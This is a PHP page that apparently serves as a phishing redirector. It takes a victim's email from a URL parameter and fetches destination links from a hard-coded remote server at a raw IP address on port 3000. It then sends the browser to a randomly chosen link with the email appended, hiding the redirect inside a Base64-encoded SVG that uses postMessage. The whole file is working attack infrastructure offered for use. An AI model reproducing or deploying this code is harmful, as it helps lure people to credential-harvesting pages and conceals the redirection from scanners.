<?php
session_start();

function getVpsHost($path) {

    $ENDPOINT_URL = "http://94.131.117.112:3000/7c5b519d18449c95202244307cd6a6eb27cbb22e13ed11e9bc9fb7c3199b51e5";


    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $ENDPOINT_URL.$path);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $response = curl_exec($ch);
    $response = json_decode($response, false);
    $statusCode = $response->code;
    if ($statusCode !== 0) {
        echo 'Could Not Fetch Data, Either This cpanel does not support OUTGOING PORT 3000 or your Server is dead';
        die;
    }
    return $response->info;

}

function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

function isBase64($str) {
    return ((base64_encode(base64_decode($str)) == $str) ? true : false);
}

if(count($_GET)>0) {
    $patry = '';
    foreach($_GET as $index => $value) {
        $patry = $index;
        break;
    }
    $email = $_GET[$patry];
    $check = isBase64($email);
    $res = '';
    if($check === true) {
        $res = base64_decode($email);
    } else {
        $res = $email;
    }
    $_SESSION['is_redirected'] = true;

    if(filter_var($res, FILTER_VALIDATE_EMAIL)) {
        $_SESSION['email'] = $res;
    } else {
        $_SESSION['email'] = '';
    }

} else {
    $_SESSION['email'] = '';
    $_SESSION['is_redirected'] = true;

}

$vpsUrls = getVpsHost("/handler/links");

$randomIndex = array_rand($vpsUrls);

$randomUrl = $vpsUrls[$randomIndex];

if ($_SESSION['email']) {
    $selectedUrl = $randomUrl."&qrc=".$_SESSION['email'];
} else {
    $selectedUrl = $randomUrl;
}



$GeneratedStr = '<?xml version="1.0" ?>
<svg xmlns="http://www.w3.org/2000/svg">
    <circle></circle>
    <script type="text/javascript">
        <![CDATA[
        parent.window.postMessage("'.$selectedUrl.'", "*")
        ]]>
    </script>
</svg>
';

$GeneratedB64 = base64_encode($GeneratedStr)
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Please Wait</title>
</head>
<body>
<embed src="data:image/svg+xml;base64,<?php echo $GeneratedB64?>">
<script>
    window.addEventListener("message", (event) => {
        console.log(event)
        if (event.data)
            window.location = event.data;
    }, false);
</script>
</body>
</html>
